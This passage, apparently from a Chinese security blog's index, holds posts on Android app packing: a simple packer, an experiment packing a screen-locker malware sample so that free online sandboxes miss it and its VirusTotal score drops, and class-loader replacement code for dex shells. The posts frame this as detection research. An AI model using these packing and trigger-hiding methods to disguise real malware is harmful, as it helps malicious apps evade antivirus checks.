class=\"line\">环境：jdk18</span><br></pre></td></tr></table></figure>\n\n<p>测试：</p>\n<p>这里我随便编写一个样本，然后使用GDA打开</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer2/12.png\" alt=\"image-20221006201142551\"></p>\n<p>可以发现源代码十分的简单，然后我们使用加壳工具</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer2/13.png\" alt=\"image-20221006201308406\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer2/14.png\" alt=\"image-20221006201340385\"></p>\n<p>这里生成了加壳后的签名和未签名的样本，我们可以直接运行的是签名的样本，我们首先查看加壳的效果</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer2/15.png\" alt=\"image-20221006201459821\"></p>\n<p>大家是不是觉得和一些厂商的类型似曾相识呢，这里就实现了简易的第一代加壳器，当然我们可以看是否能运行</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer2/16.png\" alt=\"image-20221006201631521\"></p>\n<p>成功运行，说明是可以使用的</p>\n<h2 id=\"四、总结\"><a href=\"#四、总结\" class=\"headerlink\" title=\"四、总结\"></a>四、总结</h2><p>当然这种加壳方式是十分简单的，这里可以进行加密、采用不落地加载、再慢慢到抽取壳、dex2c&#x2F;dex-vmp，大家是不是发现加壳技术的发展也是一步步实现的，脱壳的方法我前面文章已经讲了，这里的加壳方法由于未加密，使用其他工具甚至可以直接查看</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer2/17.png\" alt=\"image-20221006201929012\"></p>\n<p>使用jadx-gui还是可以查看到源码，这是因为GDA和jadx-gui的解析方式不一样，不过如果我们加密了，jadx-gui就无法很好查看了</p>\n<p>最后这里我是接原作者的ApkPacker给大家再一次梳理的简易加壳器的步骤，其实核心原理大家看我前面两篇文章就可以掌握</p>\n<p>加壳器存在知识星球：安全后厨，后面上传github</p>\n<p>后续会陆续讲解简易抽取壳的实现，简易dex-vmp的实现以及相应的脱壳方案，大家可以关注微信公众号：安全后厨</p>\n<h2 id=\"五、参考链接\"><a href=\"#五、参考链接\" class=\"headerlink\" title=\"五、参考链接\"></a>五、参考链接</h2><p><a href=\"https://bbs.pediy.com/thread-273880.htm#msg_header_h2_1\">https://bbs.pediy.com/thread-273880.htm#msg_header_h2_1</a></p>\n<p><a href=\"https://github.com/overturncat/reverse_android/tree/master/ApkPacker\">https://github.com/overturncat/reverse_android/tree/master/ApkPacker</a></p>\n","categories":["Android加壳与脱壳"],"tags":["逆向技术","加壳与脱壳"]},{"title":"Android加壳与脱壳（3）—— 一次加壳恶意应用的对抗","url":"/2022/12/04/Packer3/","content":"<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>Android恶意应用的研究也是热点之一，近些年来，恶意应用的检测逐渐变成难点，以往常见的Android恶意应用的检测方式为：特征码、熵值、机器学习&#x2F;深度学习等，但随着防护技术的进一步发展，Android恶意应用的检测又进入一个新的难点。现有的恶意应用检测的难点包括：</p>\n<span id=\"more\"></span>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）恶意行为具备定制性，比如很多的恶意应用针对不同的厂商有不同的定制策略，这样使得机器学习效果较差</span><br><span class=\"line\">（2）恶意行为进行加壳，一些恶意样本采用vmp等加壳技术，将恶意行为进行隐藏</span><br><span class=\"line\">（3）恶意行为难为难以触发溯源：一些恶意样本的触发具备一定的条件限制，比如采用云控触发的方式，在某个时间点进行触发</span><br><span class=\"line\">（4）恶意行为变种较快：一些恶意应用变种较快</span><br></pre></td></tr></table></figure>\n\n<p>今天我们关注恶意应用中的加壳类，加壳恶意应用是否能有效规避一些在线沙箱呢，上篇文章中我们借用开源代码实现了一个简易的一代壳加壳器，这里我们就趁热打铁来开展一次小实验，帮助大家了解恶意应用的对抗。</p>\n<h2 id=\"二、实验\"><a href=\"#二、实验\" class=\"headerlink\" title=\"二、实验\"></a>二、实验</h2><h3 id=\"1-实验准备\"><a href=\"#1-实验准备\" class=\"headerlink\" title=\"1.实验准备\"></a>1.实验准备</h3><p>一代壳自动加壳器ApkPacker（上篇文章我们已经给出，大家自取）</p>\n<p>恶意锁机样本hl.apk</p>\n<p>在线病毒沙箱：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">奇安信 威胁情报中心 https://sandbox.ti.qianxin.com/sandbox/page</span><br><span class=\"line\">腾讯哈勃分析系统    https://habo.qq.com/</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-实验过程\"><a href=\"#2-实验过程\" class=\"headerlink\" title=\"2.实验过程\"></a>2.实验过程</h3><h4 id=\"（1）恶意样本分析\"><a href=\"#（1）恶意样本分析\" class=\"headerlink\" title=\"（1）恶意样本分析\"></a>（1）恶意样本分析</h4><p>我们这里先静态查看一下我们的恶意样本，并动态运行一下查看实际效果</p>\n<p>静态分析：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer3/1.png\" alt=\"image-20221008204446600\"></p>\n<p>从静态层面可以看出十分符合锁机病毒的特征，感觉可能是三层锁机样本</p>\n<p>动态运行：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer3/2.png\" alt=\"image-20221008204627425\"></p>\n<p>不出任何意外，这里已经成功的锁机，这里我们在模拟器中运行，模拟器已经无法响应，这个原理我在看雪上有文章解释，大家可以去查看，这里大家不要在真机运行</p>\n<h4 id=\"（2）沙箱分析\"><a href=\"#（2）沙箱分析\" class=\"headerlink\" title=\"（2）沙箱分析\"></a>（2）沙箱分析</h4><p>经过前面的分析，我们已经很明显知道这是一个病毒锁机样本，下面我们用网上免费的两个沙箱来识别下</p>\n<p>腾讯：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer3/3.png\" alt=\"image-20221008204839688\"></p>\n<p>奇安信：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer3/4.png\" alt=\"image-20221008204914824\"></p>\n<p>可以看出无论是腾讯还是奇安信都很快识别出是病毒，其实这两个沙箱既可以静态分析，又有动态分析过程，那么沙箱到底是通过静态特征码还是动态行为去识别恶意样本，我们来具体实验下</p>\n<h4 id=\"（3）加壳\"><a href=\"#（3）加壳\" class=\"headerlink\" title=\"（3）加壳\"></a>（3）加壳</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">sh ApkPacker.sh hl.apk</span><br></pre></td></tr></table></figure>\n\n<p>我们打开我们前面的一代壳加壳器，这里我重新编写的自己的壳代码，加壳步骤很简单，参考上篇文章，这里我们就直接看加壳后的样本</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer3/5.png\" alt=\"image-20221008205505381\"></p>\n<p>可以发现加壳成功，这里就是简单的一代壳，我们在模拟器中也是可以正常的运行的</p>\n<h4 id=\"（4）实验对比\"><a href=\"#（4）实验对比\" class=\"headerlink\" title=\"（4）实验对比\"></a>（4）实验对比</h4><p>我们将前面加壳前后的样本在沙箱中运行进行对比</p>\n<p>腾讯：</p>\n<p>加壳前：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer3/7.png\" alt=\"image-20221008205753375\"></p>\n<p><strong>加壳后</strong></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer3/6.png\" alt=\"image-20221008205721923\"></p>\n<p>奇安信：</p>\n<p><strong>加壳前</strong></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer3/8.png\" alt=\"image-20221008205839831\"></p>\n<p><strong>加壳后</strong></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer3/9.png\" alt=\"image-20221008205907961\"></p>\n<p>综述我们可以推测这两个免费版沙箱是通过特征码进行检测，而且对apk解析不彻底，因为这里我们的源代码并未加密而是直接保存在样本中，但是沙箱好像还是没检测出来</p>\n<h4 id=\"（5）VirusTotal\"><a href=\"#（5）VirusTotal\" class=\"headerlink\" title=\"（5）VirusTotal\"></a>（5）VirusTotal</h4><p>我们这里因为用了很简单的加壳技术，也并未对源样本加密，所以应该是很容易检测出来的，我们使用ViruTotal来检测</p>\n<p>加壳前</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer3/10.png\" alt=\"image-20221008210342685\"></p>\n<p>加壳后</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer3/11.png\" alt=\"image-20221008210405210\"></p>\n<p>可以明显看见ViruTotal有很丰富的病毒引擎，还是可以检测出来，不过我们加壳后的分数变低说明是有效果的，如果我们使用更为复杂的加壳技术，分数一定会进一步增加</p>\n<p>当然不少朋友说，还可以检测病毒的行为特点，但是如果我们在病毒中隐藏行为，比如行为只在特定时间、特定设备、特定人群去触发，这样就难以通过行为来进行捕获</p>\n<p>从一定程度来说，加壳防护+行为隐藏+云端下发等进一步加大了当前恶意应用检测的难度</p>\n<h2 id=\"三、实验总结\"><a href=\"#三、实验总结\" class=\"headerlink\" title=\"三、实验总结\"></a>三、实验总结</h2><p>本文只是一次Android恶意应用检测的对抗实验，实验的技术十分简单，但却很明显的揭示了当前的恶意应用检测初步对抗，感兴趣朋友可以加入知识星球进一步探讨研究</p>\n","categories":["Android加壳与脱壳"],"tags":["逆向技术","加壳与脱壳"]},{"title":"Android加壳与脱壳（5）——整体加壳原理和脱壳技巧详解","url":"/2022/12/04/Packer5/","content":"<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>为了帮助更加方便的进行漏洞挖掘工作，前面我们通过了几篇文章详解的给大家介绍了动态调试技术、过反调试技术、Hook技术、过反Hook技术、抓包技术等，掌握了这些可以很方便的开展App漏洞挖掘工作，而最后我们还需要掌握一定的脱壳技巧，进行进一步助力我们漏洞挖掘的效率，本文主要介绍Android App加壳中的整体dex加壳，帮助大家掌握加壳的原理和脱壳的各种技能。</p>\n<span id=\"more\"></span>\n\n<p>本文第二节主要讲述Android启动流程和加壳原理</p>\n<p>本文第三节主要介绍整体加壳的实现</p>\n<p>本文第四节主要讲当下脱壳点的概念</p>\n<p>本文第五节讲述现有的脱壳技巧</p>\n<h2 id=\"二、相关介绍\"><a href=\"#二、相关介绍\" class=\"headerlink\" title=\"二、相关介绍\"></a>二、相关介绍</h2><h3 id=\"1-Android-App启动流程\"><a href=\"#1-Android-App启动流程\" class=\"headerlink\" title=\"1.Android App启动流程\"></a>1.Android App启动流程</h3><h4 id=\"（1）Android系统启动流程\"><a href=\"#（1）Android系统启动流程\" class=\"headerlink\" title=\"（1）Android系统启动流程\"></a>（1）Android系统启动流程</h4><p>我们要彻底的了解App加壳原理，首先我们从了解App的启动流程出发，先于App启动之前，Android系统是启动最早，下面我们来详细查看一下Android系统的启动过程：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/1.png\"></p>\n<p>我在<a href=\"https://blog.csdn.net/hzwailll/article/details/85339714\">Xposed源码定制</a>一文中详细的讲解了Android的启动流程，简单来说就是：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/2.png\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">加载BootLoader --&gt; 初始化内核 --&gt; 启动init进程 --&gt; init进程fork出Zygote进程 --&gt; Zygote进程fork出SystemServer进程</span><br></pre></td></tr></table></figure>\n\n<p>我们就了解了最后Zygote进程fork出第一个进程：<code>SystemServer</code>进程，SystemServer主要完成了以下工作：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/3.png\" alt=\"image-20220612154820955\"></p>\n<p><strong>android app安装</strong></p>\n<p>首先这里我们先介绍一下<code>PackageManagerService</code>，其主要是完成Android中应用程序安装的服务，我们了解的Android应用程序安装的方式：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">· 系统启动时安装，没有安装界面</span><br><span class=\"line\">· 第三方应用安装，有安装界面，也是我们最熟悉的方式</span><br><span class=\"line\">· ADB命令安装，没有安装界面</span><br><span class=\"line\">· 通过各类应用市场安装，没有安装界面</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/4.png\" alt=\"image-20220612154820955\"></p>\n<p>虽然安装方式不同，但是最后四种方式都是通过PackageManagerService服务来完成应用程序的安装。而PackageManagerService服务则通过与Installd服务通信，发送具体的指令来执行应用程序的安装、卸载等工作</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">final</span> IPackageManager <span class=\"title function_\">main</span><span class=\"params\">(Context context, Installer installer,</span></span><br><span class=\"line\"><span class=\"params\">    <span class=\"type\">boolean</span> factoryTest, <span class=\"type\">boolean</span> onlyCore)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">PackageManagerService</span> <span class=\"variable\">m</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">PackageManagerService</span>(context, installer, factoryTest, onlyCore);</span><br><span class=\"line\">        ServiceManager.addService(<span class=\"string\">&quot;package&quot;</span>, m);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> m;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>应用程序在安装时涉及到如下几个重要目录：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/5.png\" alt=\"image-20220612154820955\"></p>\n<p>我们了解完App的安装流程是由<code>PackageManagerService</code>，同理SystemServer启动了一个更加重要的服务<code>ActivityManagerService</code>, 而AMS其中很重要的一个作用就是启动<code>Launcher</code>进程，具体是怎么启动的，大家可以参考文章:<a href=\"https://blog.csdn.net/itachi85/article/details/56669808\">Android系统启动流程（四）Launcher启动过程与系统启动流程</a>，这里就不再详细讲解，而进入<code>Launcher</code>进程，我们就进入了App启动的流程。</p>\n<h4 id=\"（2）App启动流程\"><a href=\"#（2）App启动流程\" class=\"headerlink\" title=\"（2）App启动流程\"></a>（2）App启动流程</h4><p>Android系统启动的最后一步是启动一个Home应用程序，这个应用程序用来显示系统中已经安装的应用程序，这个Home应用程序就叫做Launcher。应用程序Launcher在启动过程中会请求PackageManagerService返回系统中已经安装的应用程序的信息，并将这些信息封装成一个快捷图标列表显示在系统屏幕上，这样用户可以通过点击这些快捷图标来启动相应的应用程序</p>\n<p>前面我们描述了AMS将Launcher启动，然后进入App启动流程，这里参考文章：<a href=\"https://blog.csdn.net/hzwailll/article/details/85339714\">ActivityThread的理解和APP的启动过程</a></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/6.png\" alt=\"image-20220612154820955\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">(1)点击桌面APP图标时，Launcher的startActivity()方法，通过Binder通信，调用system_server进程中AMS服务的startActivity方法，发起启动请求</span><br><span class=\"line\">(2)system_server进程接收到请求后，向Zygote进程发送创建进程的请求</span><br><span class=\"line\">(3)Zygote进程fork出App进程，并执行ActivityThread的main方法，创建ActivityThread线程，初始化MainLooper，主线程Handler，同时初始化ApplicationThread用于和AMS通信交互</span><br><span class=\"line\">(4)App进程，通过Binder向sytem_server进程发起attachApplication请求，这里实际上就是APP进程通过Binder调用sytem_server进程中AMS的attachApplication方法,AMS的attachApplication方法的作用是将ApplicationThread对象与AMS绑定</span><br><span class=\"line\">(5)system_server进程在收到attachApplication的请求，进行一些准备工作后，再通过binder IPC向App进程发送handleBindApplication请求（初始化Application并调用onCreate方法）和scheduleLaunchActivity请求（创建启动Activity）</span><br><span class=\"line\">(6)App进程的binder线程（ApplicationThread）在收到请求后，通过handler向主线程发送BIND_APPLICATION和LAUNCH_ACTIVITY消息，这里注意的是AMS和主线程并不直接通信，而是AMS和主线程的内部类ApplicationThread通过Binder通信，ApplicationThread再和主线程通过Handler消息交互。</span><br><span class=\"line\">(7)主线程在收到Message后，创建Application并调用onCreate方法，再通过反射机制创建目标Activity，并回调Activity.onCreate()等方法</span><br><span class=\"line\">(8)到此，App便正式启动，开始进入Activity生命周期，执行完onCreate/onStart/onResume方法，UI渲染后显示APP主界面</span><br></pre></td></tr></table></figure>\n\n<p>到这里，我们的大致弄清了APP的启动流程，而这里我们就进入了加壳中十分重要的地方<code>ActivityTread</code></p>\n<h4 id=\"（3）ActivityThread启动流程\"><a href=\"#（3）ActivityThread启动流程\" class=\"headerlink\" title=\"（3）ActivityThread启动流程\"></a>（3）ActivityThread启动流程</h4><p>寒冰大佬在<a href=\"https://bbs.pediy.com/thread-252630.htm\">FART：ART环境下基于主动调用的自动化脱壳方案 </a>一文中讲述了ActivityThread.main()是进入App世界的大门，并由此展开了对加壳原理的讲述</p>\n<p>同理接下来，我们开始进行源码分析，了解ActivityThread的具体操作：</p>\n<p><code>xref/frameworks/base/core/java/android/app/ActivityThread.java</code></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/8.png\" alt=\"image-20220612164337749\"></p>\n<p>根据寒冰大佬描述，在ActivityThread完成实例化操作，调用thread.attach(false)完成一系列初始化准备工作，最后主线程进入消息循环，等待接收来自系统的消息。当收到系统发送来的bindapplication的进程间调用时，调用函数<code>handlebindapplication</code>来处理该请求</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">handleMessage</span><span class=\"params\">(Message msg)</span> &#123;</span><br><span class=\"line\">****</span><br><span class=\"line\">    <span class=\"keyword\">case</span> BIND_APPLICATION:</span><br><span class=\"line\">        Trace.traceBegin(Trace.TRACE_TAG_ACTIVITY_MANAGER, <span class=\"string\">&quot;bindApplication&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">AppBindData</span> <span class=\"variable\">data</span> <span class=\"operator\">=</span> (AppBindData)msg.obj;</span><br><span class=\"line\">        handleBindApplication(data);</span><br><span class=\"line\">        Trace.traceEnd(Trace.TRACE_TAG_ACTIVITY_MANAGER);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">****</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在处理消息过程，很很明显进入了<code>handlebindapplication</code>函数</p>\n<p>这里我再用寒冰大佬文章的内容：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/9.png\" alt=\"image-20220612164337749\"></p>\n<p>我们定位第四步，Application进行实例化，然后进入<code>makeApplication</code></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/11.png\" alt=\"image-20220612165753498\"></p>\n<p>然后我们进入<code>newApplication</code></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/12.png\" alt=\"image-20220612170020202\"></p>\n<p>这里我们可以看见完成了两件事：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）完成了Application的实例化</span><br><span class=\"line\">（2）并调用Application.attach()函数</span><br></pre></td></tr></table></figure>\n\n<p>然后我们继续进入<code>Application.attach()</code>函数</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/13.png\" alt=\"image-20220612170305879\"></p>\n<p>这里我们就进一步调用了<code>attachBaseContext()</code>方法</p>\n<p>最后回到<code>handlebindapplication</code>中执行第6步，进入callApplicationOnCreate()函数</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/14.png\" alt=\"image-20220612170604374\"></p>\n<p>就执行了<code>Application.onCreate()方法</code></p>\n<p>总结：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">从上可知, App的运行流程是</span><br><span class=\"line\">\t初始化————&gt;Application的构造函数————&gt;Application.attachBaseContext()————&gt;Application.onCreate()函数</span><br><span class=\"line\">最后才会进入MainActivity中的attachBaseContext函数、onCreate函数</span><br><span class=\"line\">所以加壳厂商要在程序正式执行前，也就是上面的流程中进行动态加载和类加载器的修正，这样才能对加密的dex进行释放，而一般的1厂商往往选择在Application中的attachBaseContext或onCreate函数进行</span><br></pre></td></tr></table></figure>\n\n<p>这里我附上网上一个大佬的详细执行流程图：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/7.png\" alt=\"image-20220612170604374\"></p>\n<h3 id=\"2-整体加壳原理详解\"><a href=\"#2-整体加壳原理详解\" class=\"headerlink\" title=\"2.整体加壳原理详解\"></a>2.整体加壳原理详解</h3><h4 id=\"（1）整体加壳原理\"><a href=\"#（1）整体加壳原理\" class=\"headerlink\" title=\"（1）整体加壳原理\"></a>（1）整体加壳原理</h4><p>Dex整体加壳可以理解为在加密的源Apk程序外面有套上了一层外壳，简单过程为：</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/15.png\" alt=\"image-20220424141415510\"></p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/16.png\" alt=\"image-20220424141415510\"></p>\n<p>如何对App进行加一层外壳呢，这里就需要应用动态加载的原理，关于动态加载和类加载器，我在上篇文章中有详细讲解：<a href=\"https://bbs.pediy.com/thread-271538.htm\">Android加壳脱壳学习（1）——动态加载和类加载机制详解</a></p>\n<p>这里我们可以用一个案例来进一步讲述，我们打开一个整体加壳的样本</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/17.png\" alt=\"image-20220612172943793\"></p>\n<p>我们很明显看见，除了一个代理类Application，其他相关的代码信息都无法发现</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/18.png\" alt=\"image-20220612173124912\"></p>\n<p>在代理类中反射调用了一些方法，很显然我们解析出的结果都无法查找，很明显就说明在Application.attchBaseContext()和Application.onCreate()中必须要完成对源加密的dex的动态加载和解密</p>\n<p>结合上面的描述，App加载应用解析时就是这个流程：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）BootClassLoader加载系统核心库</span><br><span class=\"line\">（2）PathClassLoader加载APP自身dex</span><br><span class=\"line\">（3）进入APP自身组件，解析AndroidManifest.xml，然后查找Application代理</span><br><span class=\"line\">（4）调用声明Application的attachBaseContext()对源程序进行动态加载或解密</span><br><span class=\"line\">（5）调用声明Application的onCreate()对源程序进行动态加载或解密</span><br><span class=\"line\">（6）进入MainActivity中的attachBaseContext()，然后进入onCreate()函数，执行源程序代码</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（2）类加载器的修正\"><a href=\"#（2）类加载器的修正\" class=\"headerlink\" title=\"（2）类加载器的修正\"></a>（2）类加载器的修正</h4><p>上面我们已经很清晰的了解了壳加载的流程，我们很明显的意识到一个问题，我们从头到尾都是用<code>PathClassLoader</code>来加载dex，而上篇文章我在讲类加载器的过程中说过</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/19.png\" alt=\"image-20220612185103615\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Android中的ClassLoader类型分为系统ClassLoader和自定义ClassLoader。其中系统ClassLoader包括<span class=\"number\">3</span>种是BootClassLoader、DexClassLoader、PathClassLoader</span><br><span class=\"line\">(<span class=\"number\">1</span>)BootClassLoader:Android平台上所有Android系统启动时会使用BootClassLoader来预加载常用的类</span><br><span class=\"line\">(<span class=\"number\">2</span>)BaseDexClassLoader:实际应用层类文件的加载，而真正的加载委托给pathList来完成</span><br><span class=\"line\">(<span class=\"number\">3</span>)DexClassLoader:可以加载dex文件以及包含dex的压缩文件(apk,dex,jar,zip),可以安装一个未安装的apk文件，一般为自定义类加载器</span><br><span class=\"line\">(<span class=\"number\">4</span>)PathClassLoader:可以加载系统类和应用程序的类，通常用来加载已安装的apk的dex文件</span><br><span class=\"line\"> </span><br><span class=\"line\">补充：</span><br><span class=\"line\">Android 提供的原生加载器叫做基础类加载器，包括：BootClassLoader，PathClassLoader，DexClassLoader，InMemoryDexClassLoader（Android <span class=\"number\">8.0</span> 引入），DelegateLastClassLoader（Android <span class=\"number\">8.1</span> 引入）</span><br></pre></td></tr></table></figure>\n\n<p>我们要想动态加载dex文件必须使用自定义的<code>DexClassLoader</code>，那我们直接使用<code>DexClassLoader</code>进行加载就可以么，很显然不行，还是会报异常</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">DexClassLoader加载的类是没有组件生命周期的，即DexClassLoader即使通过对APK的动态加载完成了对组件类的加载，当系统启动该组件时，依然会出现加载类失败的异常</span><br></pre></td></tr></table></figure>\n\n<p>所以我们要想使用DexClassLoader进行动态加载dex，我们需要进行类加载器的修正</p>\n<p>当前实现类加载器的修正，主要有两种方案：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">（1）替换系统组件类加载器为我们的DexClassLoader，同时设置DexClassLoader的parent为系统组件加载器</span><br><span class=\"line\">（2）打破原有的双亲委派关系，在系统组件类加载器PathClassLoader和BootClassLoader的中间插入我们自己的DexClassLoader</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"lt-1-gt-类加载器替换\"><a href=\"#lt-1-gt-类加载器替换\" class=\"headerlink\" title=\"&lt;1&gt;类加载器替换\"></a>&lt;1&gt;类加载器替换</h5><p>怎么去替换系统的类加载器了，这就和我们上面分析的ActivityThread中<code>LoadedApk</code>有关了，<code>LoadedApk</code>主要负责加载一个Apk程序，我们进一步分析源码</p>\n<p><img src=\"https://pic-1307040378.cos.ap-chengdu.myqcloud.com/packer5/20.png\" alt=\"image-20220612190524422\"></p>\n<p>很明显，我们可以想到我们通过反射获取mclassLoader，然后使用我们的DexClassLoader进行替换，不就可以成功的让DexClassLoader拥有生命周期了么</p>\n<p>源码实现：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">总结：</span><br><span class=\"line\">\t（<span class=\"number\">1</span>）获取ActivityThread实例</span><br><span class=\"line\">\t（<span class=\"number\">2</span>）通过反射获取类加载器</span><br><span class=\"line\">\t（<span class=\"number\">3</span>）获取LoadedApk</span><br><span class=\"line\">\t（<span class=\"number\">4</span>）获取mClassLoader系统类加载器</span><br><span class=\"line\">\t（<span class=\"number\">5</span>）替换自定义类加载器为系统类加载器</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">replaceClassLoader</span><span class=\"params\">(Context context,ClassLoader dexClassLoader)</span>&#123;</span><br><span class=\"line\">       <span class=\"type\">ClassLoader</span> <span class=\"variable\">pathClassLoader</span> <span class=\"operator\">=</span> MainActivity.class.getClassLoader();</span><br><span class=\"line\">       <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">           <span class=\"comment\">//1.获取ActivityThread实例</span></span><br><span class=\"line\">           <span class=\"type\">Class</span> <span class=\"variable\">ActivityThread</span> <span class=\"operator\">=</span> pathClassLoader.loadClass(<span class=\"string\">&quot;android.app.ActivityThread&quot;</span>);</span><br><span class=\"line\">           <span class=\"type\">Method</span> <span class=\"variable\">currentActivityThread</span> <span class=\"operator\">=</span> ActivityThread.getDeclaredMethod(<span class=\"string\">&quot;currentActivityThread&quot;</span>);</span><br><span class=\"line\">           <span class=\"type\">Object</span> <span class=\"variable\">activityThreadObj</span> <span class=\"operator\">=</span> currentActivityThread.invoke(<span class=\"literal\">null</span>);</span><br><span class=\"line\">           <span class=\"comment\">//2.通过反射获得类加载器</span></span><br><span class=\"line\">           <span class=\"comment\">//final ArrayMap&lt;String, WeakReference&lt;LoadedApk&gt;&gt; mPackages = new ArrayMap&lt;&gt;();</span></span><br><span class=\"line\">           <span class=\"type\">Field</span> <span class=\"variable\">mPackagesField</span> <span class=\"operator\">=</span> ActivityThread.getDeclaredField(<span class=\"string\">&quot;mPackages&quot;</span>);</span><br><span class=\"line\">           mPackagesField.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">           <span class=\"comment\">//3.拿到LoadedApk</span></span><br><span class=\"line\">           <span class=\"type\">ArrayMap</span> <span class=\"variable\">mPackagesObj</span> <span class=\"operator\">=</span> (ArrayMap) mPackagesField.get(activityThreadObj);</span><br><span class=\"line\">           <span class=\"type\">String</span> <span class=\"variable\">packagename</span> <span class=\"operator\">=</span> context.getPackageName();</span><br><span class=\"line\">           <span class=\"type\">WeakReference</span> <span class=\"variable\">wr</span> <span class=\"operator\">=</span> (WeakReference) mPackagesObj.get(packagename);</span><br><span class=\"line\">           <span class=\"type\">Object</span> <span class=\"variable\">LoadApkObj</span> <span class=\"operator\">=</span> wr.get();</span><br><span class=\"line\">           <span class=\"comment\">//4.拿到mclassLoader</span></span><br><span class=\"line\">           <span class=\"type\">Class</span> <span class=\"variable\">LoadedApkClass</span> <span class=\"operator\">=</span> pathClassLoader.loadClass(<span class=\"string\">&quot;android.app.LoadedApk&quot;</span>);</span><br><span class=\"line\">           <span class=\"type\">Field</span> <span class=\"variable\">mClassLoaderField</span> <span class=\"operator\">=</span> LoadedApkClass.getDeclaredField(<span class=\"string\">&quot;mClassLoader&quot;</span>);</span><br><span class=\"line\">           